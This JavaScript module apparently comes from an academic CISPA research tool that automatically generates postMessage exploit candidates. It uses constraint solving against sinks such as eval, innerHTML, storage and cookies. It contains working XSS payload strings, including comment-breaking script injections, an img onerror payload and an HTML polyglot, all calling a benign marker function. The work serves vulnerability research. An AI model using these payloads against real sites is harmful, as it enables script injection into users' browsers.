/*
Copyright (C) 2020  Marius Steffens, CISPA

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

import {deepClone, randomString} from "./util";

const SINK_MAPPING = {
  'eval': 'JS',
  'document.write': 'HTML',
  'document.writeln': 'HTML',
  'innerHTML': 'HTML',
  'jquery': 'HTML',
  'scriptTextContent': 'JS',
  'insertAdjacentHTML': 'HTML',
  'postMessage': 'PM',
  'storage': 'storage',
  'cookie': 'cookie',

};

function addPropToObj(obj, acc) {
  if (typeof obj[acc] === 'object') {
    // all good we have nothig to worry bout and can just add another one if necessary
  } else {
    // well we have constraint solved that parts of the thing needs to be that specific string
    // substitute the string to a random key and hope for the best
    let cur_value = obj[acc];
    obj[acc] = {};
    obj[acc]['__hope_for_the_best'] = cur_value;
  }
}

function getJSExploits(sinkObject) {
  let left, right;
  let nonce_1 = randomString();
  let nonce_2 = randomString();
  let nonce_3 = randomString();
  let nonce_4 = randomString();
  let nonce_5 = randomString();
  let nonce_6 = randomString();
  let nonce_7 = randomString();
  let nonce_8 = randomString();
  let nonce_9 = randomString();


  let exploits = new Map();
  let startswith_exploit_1 = {
    "type": "member_function",
    "function_name": "startsWith",
    "args": [
      '__crawly__("' + nonce_1 + '")/*'
    ]
  };
  let endswith_exploit_1 = {
    "type": "member_function",
    "function_name": "endsWith",
    "args": [
      ' */'
    ]
  };
  left = deepClone(sinkObject);
  right = deepClone(sinkObject);
  left.ops.push(startswith_exploit_1);
  right.ops.push(endswith_exploit_1);

  let exp_1 = {type: 'Logical', op: '&&', l_val: left, r_val: right};
  exploits.set(nonce_1, exp_1);

  let startswith_exploit_2 = {
    "type": "member_function",
    "function_name": "startsWith",
    "args": [
      '(__crawly__("' + nonce_2 + '")/*'
    ]
  };
  let endswith_exploit_2 = {
    "type": "member_function",
    "function_name": "endsWith",
    "args": [
      ' */)'
    ]
  };

  left = deepClone(sinkObject);
  right = deepClone(sinkObject);
  left.ops.push(startswith_exploit_2);
  right.ops.push(endswith_exploit_2);

  let exp_2 = {type: 'Logical', op: '&&', l_val: left, r_val: right};
  exploits.set(nonce_2, exp_2);

  let endswith_exploit_3 = {
    "type": "member_function",
    "function_name": "endsWith",
    "args": [
      ' */__crawly__("' + nonce_3 + '")'
    ]
  };
  let startswith_exploit_3 = {
    "type": "member_function",
    "function_name": "startsWith",
    "args": [
      '/*'
    ]
  };

  left = deepClone(sinkObject);
  right = deepClone(sinkObject);
  left.ops.push(startswith_exploit_3);
  right.ops.push(endswith_exploit_3);

  let exp_3 = {type: 'Logical', op: '&&', l_val: left, r_val: right};
  exploits.set(nonce_3, exp_3);

  let kameeleon = deepClone(sinkObject);
  kameeleon.ops.push({
    type: "Binary",
    op: '===',
    side: 'left',
    val: 'Kameleoon=1,__crawly__("' + nonce_4 + '")'
  });

  exploits.set(nonce_4, kameeleon);

  let startsWithFixObject = deepClone(sinkObject);
  startsWithFixObject.ops.push({
    type: "member_function",
    function_name: "endsWith",
    args: ['.toString(),__crawly__("' + nonce_5 + '")']
  });

  exploits.set(nonce_5, startsWithFixObject);

  let startsWithAssignement = deepClone(sinkObject);
  startsWithAssignement.ops.push({
    type: "member_function",
    function_name: "endsWith",
    args: ['1;__crawly__("' + nonce_6 + '");']
  });

  exploits.set(nonce_6, startsWithAssignement);

  let startsWithAssignementWithoutEqual = deepClone(sinkObject);
  startsWithAssignementWithoutEqual.ops.push({
    type: "member_function",
    function_name: "endsWith",
    args: ['=1;__crawly__("' + nonce_7 + '");']
  });

  exploits.set(nonce_7, startsWithAssignementWithoutEqual);


  let endsWithanything = deepClone(sinkObject);
  endsWithanything.ops.push({
    type: "member_function",
    function_name: "startsWith",
    args: ['__crawly__("' + nonce_8 + '");//']
  });

  exploits.set(nonce_8, endsWithanything);

  let wrapped_function = deepClone(sinkObject);
  wrapped_function.ops.push({
    "type": "member_function",
    "function_name": "startsWith",
    "args": [
      '(function(){__crawly__("' + nonce_9 + '")})();//'
    ]
  });
  exploits.set(nonce_9, wrapped_function);

  return exploits;

}

function getStorageExploits(key_obj, val_obj) {
  let exploits = new Map();
  let nonce_1 = randomString();

  let key_const = deepClone(key_obj);
  let val_const = deepClone(val_obj);

  key_const.ops.push({
    "type": "Binary",
    "op": '===',
    "side": "left",
    "val": nonce_1
  });

  val_const.ops.push({
    "type": "Binary",
    "op": '===',
    "side": "left",
    "val": nonce_1
  });

  exploits.set(nonce_1, {
    "type": "Logical",
    "op": '&&',
    "l_val": key_const,
    "r_val": val_const
  });

  return exploits
}

function getHTMLExploits(sinkObject) {
  let exploits = new Map();

  let nonce_1 = randomString();
  let exp1 = deepClone(sinkObject)
  let img_payload = '<img src="foo" onerror="__crawly__(`__report_id`)" onload="__crawly__(`__report_id`)"><textarea>';
  exp1.ops.push({
    "type": "member_function",
    "function_name": "indexOf",
    "args": [img_payload.replace(/__report_id/g, nonce_1)],
  });
  exp1.ops.push({type: 'Binary', op: '>', side: 'left', val: 0})
  exploits.set(nonce_1, exp1)
  let nonce_3 = randomString();
  let exp3 = deepClone(sinkObject);
  let polyglot = "`'\">--!></stYle/</titLe/</teXtarEa/</scRipt/><img/src=foo oNloAd=__crawly__(`__report_id`)//>\x3e\n";
  exp3.ops.push({
    "type": "member_function",
    "function_name": "indexOf",
    "args": [polyglot.replace(/__report_id/g, nonce_3)],
  });
  exp3.ops.push({type: 'Binary', op: '>', side: 'left', val: 0});
  exploits.set(nonce_3, exp3);


  return exploits

}

function getOriginConstraints() {
  return {
    type: 'Logical', op: '||', l_val: {
      "ops": [
        {
          "type": "ops_on_parent_element",
          "old_identifier": "event",
          "old_ops": []
        },
        {
          "type": "member_function",
          "function_name": "substring",
          "args": [
            0, 7
          ]
        },
        {
          "type": 'Binary',
          "side": "left",
          "val": "http://",
          "op": '==='
        }
      ],
      "identifier": "event.origin"
    }, r_val: {
      "ops": [
        {
          "type": "ops_on_parent_element",
          "old_identifier": "event",
          "old_ops": []
        },
        {
          "type": "member_function",
          "function_name": "substring",
          "args": [
            0, 8
          ]
        },
        {
          "type": 'Binary',
          "side": "left",
          "val": "https://",
          "op": '==='
        }
      ],
      "identifier": "event.origin"
    }
  }
}

function getCookieExploits(sinkObject) {
  let nonce1 = randomString();
  let exploits = new Map();


  let constraints = deepClone(sinkObject);
  constraints.ops.push({
    "type": "member_function",
    "function_name": "startsWith",
    "args": [nonce1 + '=' + nonce1 + ';']
  });
  exploits.set(nonce1, constraints);

  return exploits
}

async function generateExploitForReport(report, handler_id) {
  console.log('=============');
  console.log('Starting exploit generation for ', report);
  let inferred_types = {};
  try {
    //inferred_types = inferTypes(report.ev)
    inferred_types = report.typeInfo;
  } catch (e) {
    console.error('Error when infering types', e)
  }
  let sink_obj_constraints;
  switch (SINK_MAPPING[report.sink]) {
    case 'JS':
      sink_obj_constraints = getJSExploits(report.sinkObject);
      break;
    case 'HTML':
      sink_obj_constraints = getHTMLExploits(report.sinkObject);
      break;
    case 'storage':
      sink_obj_constraints = getStorageExploits(report.key_obj, report.val_obj);
      break;
    case 'cookie':
      sink_obj_constraints = getCookieExploits(report.sinkObject);
      break;

    default:
      throw Error('Sink not yet supported ' + report.sink)
  }

  let cs = report['constraints'];
  let constraintId = await window.__reportBaseConstraint(cs, handler_id);

  let origin_constraint = getOriginConstraints();
  let exploit_candidates = [];
  for (let exploitId of sink_obj_constraints.keys()) {
    let candidate = sink_obj_constraints.get(exploitId);
    let cs_cloned = deepClone(cs);
    // append exploit constraints
    cs_cloned.push(candidate);
    // append constraints for origin, e.g. starts with http etc
    cs_cloned.push(origin_constraint);
    // solve
    let res = await window.__trySolveForSat(cs_cloned, inferred_types, constraintId, [candidate, origin_constraint], report['sink']);
    if (res !== undefined) {
      exploit_candidates.push({exploitCandidateId: res[1], exploitId: exploitId, payload_sat: res[0]});
    }
  }
  if (exploit_candidates.length === 0) {
    return undefined
  }
  let messages = [];
  for (let entry of exploit_candidates) {
    let mess1 = generateObjectFromAssignements(entry['payload_sat']['assignements'])['event'];
    let mess2 = generateObjectFromAssignements(entry['payload_sat']['assignements'], undefined, false)['event'];
    messages.push({
      exploitId: entry['exploitId'],
      exploitCandidateId: entry['exploitCandidateId'],
      message: adjustForTypes(mess1, entry['payload_sat']['types'])
    });
    messages.push({
      exploitId: entry['exploitId'],
      exploitCandidateId: entry['exploitCandidateId'],
      message: adjustForTypes(mess2, entry['payload_sat']['types'])
    });

  }
  return {
    candidates: messages,
    sink: report.sink
  };
}

function adjustForTypes(obj, types) {
  for (let key of Object.keys(types)) {
    if (types[key] !== 'JSON') {
      continue;
    }
    let splitted = key.split('.');
    let last = splitted.slice(-1);
    let accessors = splitted.slice(0, splitted.length - 1);
    let cur_obj = obj;
    for (let accessor of accessors) {
      if (accessor.startsWith('__elem__')) {
        let num = parseInt(accessor.slice(8));
        if (!Array.isArray(cur_obj)) {
        }
        accessor = num;
      }
      if (cur_obj[accessor] === undefined) {
        break;
      }
      cur_obj = cur_obj[accessor];
    }
    cur_obj[last] = JSON.stringify(cur_obj[last])
  }
  return obj
}

function generateObjectFromAssignements(assignement, obj = undefined, dont_use_empty = true) {
  if (obj === undefined) {
    obj = {};
  }
  for (let key of Object.keys(assignement)) {
    if (dont_use_empty && assignement[key] === '') {
      continue
    }
    if (typeof assignement[key] === 'string') {
      assignement[key] = assignement[key].replace(/\\x([0-9A-F]{2})/ig, function () {
        return String.fromCharCode(parseInt(arguments[1], 16));
      });
    }
    let splitted = key.split('.');
    let last = splitted.slice(-1);
    let accessors = splitted.slice(0, splitted.length - 1);
    let cur_obj = obj;
    for (let accessor of accessors) {
      if (accessor.startsWith('__elem__')) {
        let num = parseInt(accessor.slice(8));
        if (!Array.isArray(cur_obj)) {
        }
        accessor = num;
      }
      if (cur_obj[accessor] === undefined) {
        cur_obj[accessor] = {};
      } else {
        addPropToObj(cur_obj, accessor);
      }
      cur_obj = cur_obj[accessor];
    }
    if (cur_obj[last[0]] === undefined)
      cur_obj[last[0]] = assignement[key];
    else {
      // this case only happens when we have an assignement for a parent object which is however already an object thus we cannot do it
      cur_obj[last[0]]['__hope_for_the_best'] = assignement[key]
    }
  }
  resolveSubstituteVals(obj, obj);
  return obj;
}

function resolveSubstituteVals(obj, g) {
  if (Array.isArray(obj)) {
    for (let i = 0; i < obj.length; i++) {
      let elem = resolveSubstituteVals(obj[i], g);
      if (elem) {
        obj[i] = elem;
      }
    }
  } else if (typeof obj === 'object') {
    for (let key of Object.keys(obj)) {
      let elem = resolveSubstituteVals(obj[key], g);
      if (elem) {
        obj[key] = elem
      }
    }
  } else if (typeof obj === 'string' && obj.startsWith('__substitute_values_')) {
    return g[obj];
  }
}

export {generateExploitForReport}
